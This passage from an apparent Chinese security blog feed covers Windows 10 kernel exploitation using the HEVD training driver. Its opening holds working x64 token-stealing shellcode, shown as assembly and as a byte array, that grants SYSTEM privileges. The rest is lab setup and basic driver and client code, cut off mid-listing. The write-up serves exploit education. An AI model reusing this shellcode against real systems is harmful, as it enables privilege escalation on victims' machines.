[r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: 消除低8位，便于解析Token</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System token的Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = 新的EPROCESS的token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: 消除低8位，便于解析Token</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    mov     rax, gs:188h</span><br><span class="line">    mov     cx, [rax+1E4h]</span><br><span class="line">    inc     cx</span><br><span class="line">    mov     [rax+1E4h], cx</span><br><span class="line">    mov     rdx, [rax+90h]</span><br><span class="line">    mov     rcx, [rdx+168h]</span><br><span class="line">    mov     r11, [rdx+178h]</span><br><span class="line">    mov     rsp, [rdx+180h]</span><br><span class="line">    mov     rbp, [rdx+158h]</span><br><span class="line">    xor     eax, eax</span><br><span class="line">    swapgs</span><br><span class="line">    o64 sysret</span><br></pre></td></tr></table></figure><p>得到shellcode</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">176</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF0</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line"><span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/92433bde7fdb3c57a079ce6037669523.png" alt="image-20240121200156534" /></p><p>缺点就是程序无法exit退出，不过可以在shellcode中设置Token迁移等一些其他操作，这里就不展开了</p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://wumb0.in/finding-the-base-of-the-windows-kernel.html">https://wumb0.in/finding-the-base-of-the-windows-kernel.html</a></p><p><a href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a></p><p><a href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/</a></p><p><a href="https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/">https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/</a></p><p><a href="https://mdanilor.github.io/posts/hevd-2/">https://mdanilor.github.io/posts/hevd-2/</a></p>]]></content>
    
    
    <summary type="html">&lt;hr /&gt;
&lt;p&gt;上：&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;中：&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13365&quot;&gt;https://xz.aliyun.com/t/13365&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>从零探索现代windows内核栈溢出-以HEVD练习为例（上）</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</id>
    <published>2024-01-25T07:07:29.000Z</published>
    <updated>2024-01-25T07:18:59.793Z</updated>
    
    <content type="html"><![CDATA[<p>开始做HEVD来熟悉windows的内核漏洞利用方式时，发现大多数的资料依旧基于windows7，但是目前主流的操作系统已经是win10，所以还是得更上时代潮流的</p><p>文章已在先知社区投稿：<a href="https://xz.aliyun.com/t/13363">https://xz.aliyun.com/t/13363</a></p><span id="more"></span><h1 id="0-前置环境"><a class="markdownIt-Anchor" href="#0-前置环境"></a> 0. 前置环境</h1><p>更基础</p><ul><li>WIndows10 Vmware虚拟机</li><li>Visual Studio 2019，有WDK</li><li>Windbg Preview（我用单纯是觉得更好看）</li><li>最重要的HEVD项目：<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver%EF%BC%8C%E6%88%91%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E7%9A%843.00">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver，我直接下载的3.00</a> Release版</li></ul><p>我使用的Windows版本是</p><p><img src="https://img.joe1sn.top/uploads/big/a8c845560178af29a6b56e36c93a49cd.png" alt="image-20240122113406037" /></p><h2 id="i-编程环境"><a class="markdownIt-Anchor" href="#i-编程环境"></a> I. 编程环境</h2><p><strong>如果你想快速搭建一个驱动开发环境可以参考B站上的一些资料</strong>，如：<a href="https://www.bilibili.com/video/BV1wY4y1n77F">配置驱动开发环境</a><br />如果按照步骤vs没有<code>KernelModDriver</code>这一模板，找到vs目录的<code>WDK.vsix</code>双击即可</p><p>一段驱动的主要代码，在<code>main.cpp</code>中编写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;win10.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;x64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Running -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>规定了驱动加载和卸载的两个函数，并在加载和卸载时打印调试信息</p><p><img src="https://img.joe1sn.top/uploads/big/16686bd3cbe47610118773f7164f62db.png" alt="image-20240122115841033" /></p><h2 id="ii-调试环境"><a class="markdownIt-Anchor" href="#ii-调试环境"></a> II. 调试环境</h2><h3 id="传统串口调试"><a class="markdownIt-Anchor" href="#传统串口调试"></a> 传统串口调试</h3><p>添加串口</p><img src="https://img.joe1sn.top/uploads/big/39f90005ffe45efbba9a7140e740fee8.png" alt="image-20240115212926345" style="zoom:50%;" /><p>在虚拟机中Win+R召唤<code>msconfig</code>，打开允许串口调试</p><p><img src="https://img.joe1sn.top/uploads/big/78fe2217e7b7b00cfa98a27a83058a01.png" alt="image-20240122114955532" /></p><p>然后在（记得用管理员打开）windbg中按照图中配置即可，其他选项不变</p><p><img src="https://img.joe1sn.top/uploads/big/5b31856f65b981c015c5f5fff5b6b725.png" alt="image-20240122115049006" /></p><p>一直找不到管道的话可以点Break再等会儿就有了</p><p><img src="https://img.joe1sn.top/uploads/big/19d75ecb2fd8950a1a8aba7d70805748.png" alt="img" /></p><h3 id="virtualkd法调试"><a class="markdownIt-Anchor" href="#virtualkd法调试"></a> VirtualKD法调试</h3><p>项目链接：<a href="http://virtualkd.sysprogs.org/">http://virtualkd.sysprogs.org/</a></p><p>安装后，<code>vmmon64.exe</code>就行了</p><p>但是用了就不能用串口调试了</p><p><img src="https://img.joe1sn.top/uploads/big/9c72b6b964eb66c0a1d5e7f45d2a51fc.png" alt="image-20240115222104521" /></p><h3 id="打开信息显示dbgview"><a class="markdownIt-Anchor" href="#打开信息显示dbgview"></a> 打开信息显示+DbgView</h3><p>在<code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\</code>注册表中添加<code>Debug Print Filter</code>，并设置一个<code>Default</code>的<code>DWORD</code>值，你可以将其设置为<code>0x8</code>或者允许更多调试信息的<code>0xf</code></p><p><img src="https://img.joe1sn.top/uploads/big/a71e3dc209c383a939308d3d49b272b0.png" alt="image-20240122114737436" /></p><p>虽然说windbg确实能打印出<code>DbgPrint</code>，但是HEVD使用的是<code>DbgPrintEx</code>，接受不到，安装了DbgView后，他会把调试信息打印出了并且windbg也能收到</p><p><img src="https://img.joe1sn.top/uploads/big/09c9ac07d589f67f1b6fad3b678172e4.png" alt="image-20240122113922891" /></p><h3 id="调试指令"><a class="markdownIt-Anchor" href="#调试指令"></a> 调试指令</h3><p>如果出现了以下情况且虚拟机卡顿，可以使用这两个指令关闭输出</p><p><img src="https://img.joe1sn.top/uploads/big/33f118ae586f66d022e74847ca034c38.png" alt="image-20240122114457173" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; ed nt!Kd_SXS_Mask 0</span><br><span class="line">1: kd&gt; ed nt!Kd_FUSION_Mask 0</span><br></pre></td></tr></table></figure><p><strong>关闭这两个函数的输出，莫名其妙变卡的话再用一下</strong></p><h2 id="iii-驱动加载"><a class="markdownIt-Anchor" href="#iii-驱动加载"></a> III. 驱动加载</h2><p>使用KmdManager.exe，毛子的黑科技，使用时需要管理员启动</p><p>也可以使用osLoader啥的</p><p>这里用KmdKit的KmdManager演示，运行HEVD</p><p><img src="https://img.joe1sn.top/uploads/big/54dbab58e1a08495d2692e00e28164ee.png" alt="image-20240115234008160" /></p><p><img src="https://img.joe1sn.top/uploads/big/5c22ef7ea1a4180500ef95fa027a1ecc.png" alt="image-20240117111218338" /></p><p>那么就算搭建成功</p><h1 id="a-编程基础"><a class="markdownIt-Anchor" href="#a-编程基础"></a> A. 编程基础</h1><p>关于内核模式驱动程序：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/</a></p><p>内核中交互是通过<code>IRP</code>请求进行交互的</p><blockquote><p><strong>IRP</strong> 结构是表示 <em>I/O 请求数据包</em>的部分不透明结构。 <strong>IRP</strong> 结构的未记录成员是保留的，仅由 I/O 管理器使用，在某些情况下，由文件系统驱动程序 (FSD) 使用。</p></blockquote><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp</a></p><p>使用到的内存堆栈为<code>I/O Stack</code></p><blockquote><p>I/O 管理器为分层驱动程序链中的每个驱动程序提供其设置的每个 IRP 的 I/O 堆栈位置。 每个 I/O 堆栈位置都包含 <strong>一个IO_STACK_LOCATION</strong>结构。</p></blockquote><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations</a></p><p><img src="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/images/2irpios.png" alt="说明 irp 中 i/o 堆栈位置的内容的示意图。" /></p><p>IRP通过iostack发送给设备，对应的是应用层的“消息”。设备可以存在（硬盘等），也可以不存在（QQ Protect驱动等）。</p><p>根据上图，应用层通过和设备对象（FDO）进行交互，设备（PDO）再和设备对象交互，实现交互。同时FDO向PDO的交互不是必要的。</p><blockquote><h2 id="hal-硬件抽象层"><a class="markdownIt-Anchor" href="#hal-硬件抽象层"></a> HAL 硬件抽象层</h2><p>HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，名为<code>hal.dll</code>。涉及中断控制器、单处理器/多处理器硬件断点。</p></blockquote><p><img src="https://img.joe1sn.top/uploads/big/1e87772ff6bc6d7cc688242870d4b527.png" alt="image-20240116133826071" /></p><h1 id="b-代码"><a class="markdownIt-Anchor" href="#b-代码"></a> B. 代码</h1><p><img src="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/images/driverfunctionpointers01.png" alt="图：driver-object 结构中的函数指针。" /></p><h3 id="创建设备"><a class="markdownIt-Anchor" href="#创建设备"></a> 创建设备</h3><p>MSDN：<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree">https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree</a></p><p>使用DeviceTree，可以找到：<a href="https://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip">https://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip</a></p><p><img src="https://img.joe1sn.top/uploads/big/7e44caefc4f0dd8b3fb72d5422ace35f.png" alt="image-20240116141544394" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UNICODE_STRING DeviceName = &#123; <span class="number">0</span> &#125;;          <span class="comment">//设备名</span></span><br><span class="line">PDEVICE_OBJECT pDevice = <span class="literal">NULL</span>;              <span class="comment">//设备对象</span></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, DEVICE_NAME);</span><br><span class="line">Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0</span>, &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;pDevice);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, Status);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建符号链接"><a class="markdownIt-Anchor" href="#创建符号链接"></a> 创建符号链接</h3><p><img src="https://img.joe1sn.top/uploads/big/e4fce5afcd7288e9e8cb6cb95909e77f.png" alt="image-20240116141604421" /></p><p><img src="https://img.joe1sn.top/uploads/big/60c01f30c4f411d81016e83d56d4d96c.png" alt="image-20240116141556022" /></p><p>符号链接就是类似与<code>Z:\</code>之前的前缀</p><p>使用<code>WinObj</code>可以看到，我用的再第一章中下载的<code>KdmKie</code>中的<code>SymLinks</code>（太老了，建议换一个）</p><p><img src="https://img.joe1sn.top/uploads/big/7767beddb14038bf253be19869b69628.png" alt="image-20240116141803859" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UNICODE_STRING SymLink = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;SymLink, SYM_NAME);</span><br><span class="line">Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;SymLink, &amp;DeviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Symbol Link Failed: %x\n&quot;</span>, Status);</span><br><span class="line">    <span class="built_in">IoDeleteDevice</span>(pDevice);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关联功能的交互"><a class="markdownIt-Anchor" href="#关联功能的交互"></a> 关联功能的交互</h3><h4 id="i-创建句柄"><a class="markdownIt-Anchor" href="#i-创建句柄"></a> I. 创建“句柄”</h4><p><img src="https://img.joe1sn.top/uploads/big/bdfd8cc8b7ede9711595ddbd7f5a06f5.png" alt="image-20240116142649799" /></p><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs</a></p><p>具体调试方法也在上面的文档中</p><blockquote><p>每个内核模式驱动程序都必须实现名为 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_initialize"><strong>DriverEntry</strong></a> 的函数，该函数在加载驱动程序之后会立即得到调用。 <strong>DriverEntry</strong> 函数使用指向驱动程序实现的一些其他函数的指针来填充 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object"><strong>DRIVER_OBJECT</strong></a> 结构的某些成员。 例如，<strong>DriverEntry</strong> 函数使用指向驱动程序的 <strong>Unload</strong> 函数的指针来填充 <strong>DRIVER_OBJECT</strong> 结构的 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload"><em>Unload</em></a> 成员</p></blockquote><p><img src="https://img.joe1sn.top/uploads/big/021fcdc7adca77ff40fe201966cd80c5.png" alt="image-20240116143040078" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate;</span><br></pre></td></tr></table></figure><p>根据上面的文档，创建的函数和主函数<code>Entry</code>差不多，<strong>这里用的是设备对象，不是驱动对象</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS </span></span><br><span class="line"><span class="function"><span class="title">MyCreate</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Opened\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ii-关闭句柄"><a class="markdownIt-Anchor" href="#ii-关闭句柄"></a> II. 关闭“句柄”</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyClose</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Closed\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyClean</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Clean\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4ece7b08bbaf2850915e56ec056c6bb5.png" alt="image-20240116150816039" /></p><p><img src="https://img.joe1sn.top/uploads/big/f997951f4d3315156cf557ea3c2f1f61.png" alt="image-20240116150757589" /></p><p>成功加载</p><h4 id="iii-在ring3进行交互"><a class="markdownIt-Anchor" href="#iii-在ring3进行交互"></a> III. 在Ring3进行交互</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice== INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success open\n&quot;</span>;</span><br><span 